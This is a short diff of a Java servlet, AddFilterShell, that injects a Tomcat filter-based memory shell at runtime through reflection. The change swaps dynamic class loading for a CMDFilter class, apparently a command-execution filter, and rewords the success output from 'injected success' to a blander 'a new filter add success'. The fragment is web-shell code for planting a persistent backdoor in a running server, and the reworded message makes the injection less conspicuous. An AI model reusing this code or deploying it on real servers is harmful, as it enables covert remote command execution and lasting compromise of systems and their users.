@@ -46,7 +46,8 @@ public class AddFilterShell extends HttpServlet {
                 }
 
                 // 创建自定义 Filter 对象
-                Class<?> filterClass = DynamicUtils.getClass(DynamicUtils.FILTER_CLASS_STRING);
+//                Class<?> filterClass = DynamicUtils.getClass(DynamicUtils.FILTER_CLASS_STRING);
+                Class<?> filterClass = CMDFilter.class;
 
                 // 创建 FilterDef 对象
                 FilterDef filterDef = new FilterDef();
@@ -81,8 +82,8 @@ public class AddFilterShell extends HttpServlet {
                 method.setAccessible(true);
                 method.invoke(obj,filterMap);
 
-                resp.getWriter().write("123\n");
-                resp.getWriter().write("injected success");
+                resp.getWriter().write("\n");
+                resp.getWriter().write("a new filter add success");
                 resp.getWriter().flush();
             }
         }catch (Exception e){
